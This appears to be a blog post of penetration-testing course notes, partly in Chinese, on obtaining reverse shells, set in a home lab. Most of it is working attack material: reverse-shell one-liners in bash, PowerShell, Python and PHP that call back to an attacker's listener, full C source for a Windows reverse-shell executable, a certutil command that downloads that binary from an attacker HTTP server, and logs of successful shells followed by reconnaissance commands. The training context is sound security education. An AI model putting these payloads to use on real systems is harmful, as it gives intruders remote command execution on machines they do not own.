---
layout: post
title: "Reverse Shell Cheatsheet"
date: "2023-04-21"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Reverse Shell Cheatsheet（反向 Shell 速查表）
# Demo: Reverse Shell Cheatsheet（演示：反向 Shell 备忘单）
I'll be taking you through various resources that you can use, more specifically, cheatsheets that you can use to obtain code that can be executed on the target system to connect back to a Netcat listener.

One of the great things about reverse shells is that you do not need to have Netcat listener on the target system. The connection to the Netcat listener on the attacker system can be made through the use of PowerShell code. You can do it with simple bash code or just Python code, C code. You can also generate executables that will connect to that particular listener and provide you with a reverse shell. And you don't need to rely on Netcat to initiate the connection.

Kali Linux: 10.10.10.10

Windows 7: 10.10.10.7

Reverse Shell Cheatsheet that contains a list of commands or code that can be used to connect back to a Netcat listener after being executed on the target system.

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

And in terms of the target system, there are various cheatsheets are based on the target operating system.

For example, if the target operating system is Linux, you can click on Bash TCP.

```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

All you need to do is execute this code here on the target system. And this code can be executed manually by physically accessing the system or through social engineering. This can be embedded into a payload. And in most cases, this code is typically included as part of exploit code. So once a vulnerability has been exploited, the following code is executed on the target system. And then, it's executed, and then the connection is made back to the attacker system or to the Netcat listener on the attacker system.

In terms of Windows, you're pretty much limited to only two options. You can either utilize PowerShell code.

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

For example, if this PowerShell code is executed on the target, it will connect back to our Netcat listener. And there isn't a reliance on Netcat, and the target system does not have to have Netcat installed. And PowerShell is very powerful because every Windows system comes with PowerShell and the ability to execute PowerShell code.

That's one of the techniques.

If the target is a Linux target or even a Windows target and has Python installed, then you also have Python code that will connect to a Netcat listener.

```
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

It's not limited to just operating systems. If you're targeting or exploiting a web application, you also have PHP reverse shells.

```
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

This code can be executed with PhP. It's going to connect to the attacker's system, and then executes `/bin/bash` or `/bin/sh`, and you obtain a reverse shell session.

[Reverse Shell Generator](https://www.revshells.com/)

Number one, you need to specify the IP address of the attacker system. So your Kali Linux or pentesting distribution IP address. And then, the port on which the Netcat listener is running.

In this case, what we'll be trying to do is obtain a reverse shell on a Windows system that doesn't have Netcat installed, and we are only going to utilize the PowerShell code. 

Reverse->OS Windows->PowerShell #2

All you need to do is just copy it. And then, transfer it over to the target system. This can be part of a larger exploit or you can copy it or paste all of this into a PowerShell file or a PowerShell script, for that matter, and get it executed on the target.

You can obtain a reverse shell without Netcat on the target site.

For receiving the reverse shell, we're going to set up the Netcat listener here.

```
nc -nvlp 1234
```

Switch over to Windows 7 system.

And before we executed, there are a few changes that need to be made. Because if we paste this in here, it might work during the first run. And in some cases, you may need to specify that you want to execute `powershell.exe` on certain versions of Windows.

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Switch over to my Kali Linux VM.

We get a connection from the target, the Windows 7 system.

We get a PowerShell session. And we've successfully been able to obtain a reverse shell on the target system without Netcat being installed.

This is where you can start seeing the power of reverse shells as opposed to bind shells, where you need to have a Netcat listener on the target system.

```
PS C:\Users\Win7> whoami
PS C:\Users\Win7> systeminfo
```

Get information regarding the operating system itself.

You're not just limited to PowerShell. You also have the ability to compile your own executable that will connect to the listener.

This is your Windows C code that you can then compile. And the compilation process is the same as you would be if you are trying to compile or cross compile a Windows exploit.

# 复现视频内容
Windows 7 SP1: 192.168.213.131

Ubuntu: 192.168.213.132

Kali Linux: 192.168.213.128

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```


```
bash -i >& /dev/tcp/192.168.213.128/1234 0>&1
```

```
nahida@nahida-virtual-machine:~$ bash -i >& /dev/tcp/192.168.213.128/1234 0>&1
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.132] 47360
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

nahida@nahida-virtual-machine:~$ whoami
whoami
nahida
nahida@nahida-virtual-machine:~$ id
id
uid=1000(nahida) gid=1000(nahida) groups=1000(nahida),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
nahida@nahida-virtual-machine:~$ 
```

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.213.128',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```
C:\Users\IEUser>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPC
lient('192.168.213.128',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..
65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (
New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendbac
k = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path +
 '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($s
endbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.131] 49213

PS C:\Users\IEUser> whoami
iewin7\ieuser
PS C:\Users\IEUser> systeminfo

Host Name:                 IEWIN7
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          
Registered Organization:   Microsoft
Product ID:                00392-972-8000024-85559
Original Install Date:     3/6/2018, 11:10:22 AM
System Boot Time:          4/21/2023, 6:08:33 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2304 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 1,814 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 5,667 MB
Virtual Memory: In Use:    2,522 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\IEWIN7
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2670838
                           [02]: KB2830477
                           [03]: KB2592687
                           [206]: KB976932
                           [207]: KB982018
                           [208]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.213.254
                                 IP address(es)
                                 [01]: 192.168.213.131
                                 [02]: fe80::5101:6005:31dc:e134
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```
nahida@nahida-virtual-machine:~$ export RHOST="192.168.213.128";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.132] 40800
$ whoami
whoami
nahida
$ id
id
uid=1000(nahida) gid=1000(nahida) groups=1000(nahida),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```
nahida@nahida-virtual-machine:~$ php -r '$sock=fsockopen("192.168.213.128",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.132] 50734
$ id
uid=1000(nahida) gid=1000(nahida) groups=1000(nahida),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$ whoami
nahida
```

[Reverse Shell Generator](https://www.revshells.com/)

```
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
```

```
C:\Users\IEUser>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPC
lient('192.168.213.128',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..
65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (
New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendbac
k = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path +
 '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($s
endbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.131] 49291
whoami
iewin7\ieuser
PS C:\Users\IEUser> net users

User accounts for \\IEWIN7

-------------------------------------------------------------------------------
Administrator            Guest                    IEUser                   
sshd                     sshd_server              
The command completed successfully.
```



```
┌──(root㉿kali)-[~/tmp]
└─# cat revshells.c
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.213.128"; 
char port[6] = "1234";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, sizeof(ip_addr), inet_ntoa(*((struct in_addr *)host->h_addr)));    
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}

```

```
┌──(root㉿kali)-[~/tmp]
└─# i686-w64-mingw32-gcc revshells.c -o revshell -lws2_32
```

```
┌──(root㉿kali)-[~/tmp]
└─# python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
C:\Users\IEUser>cd Downloads

C:\Users\IEUser\Downloads>certutil -urlcache -f http://192.168.213.128/revshell.exe revshell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```
┌──(root㉿kali)-[~/tmp]
└─# python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.213.131 - - [21/Apr/2023 06:22:31] "GET /revshell.exe HTTP/1.1" 200 -
192.168.213.131 - - [21/Apr/2023 06:22:45] "GET /revshell.exe HTTP/1.1" 200 -
```

```
┌──(root㉿kali)-[~/tmp]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```
C:\Users\IEUser\Downloads>revshell.exe
```

```
┌──(root㉿kali)-[~/tmp]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.131] 49169
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Downloads>whoami
whoami
iewin7\ieuser

C:\Users\IEUser\Downloads>net group
net group
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.
``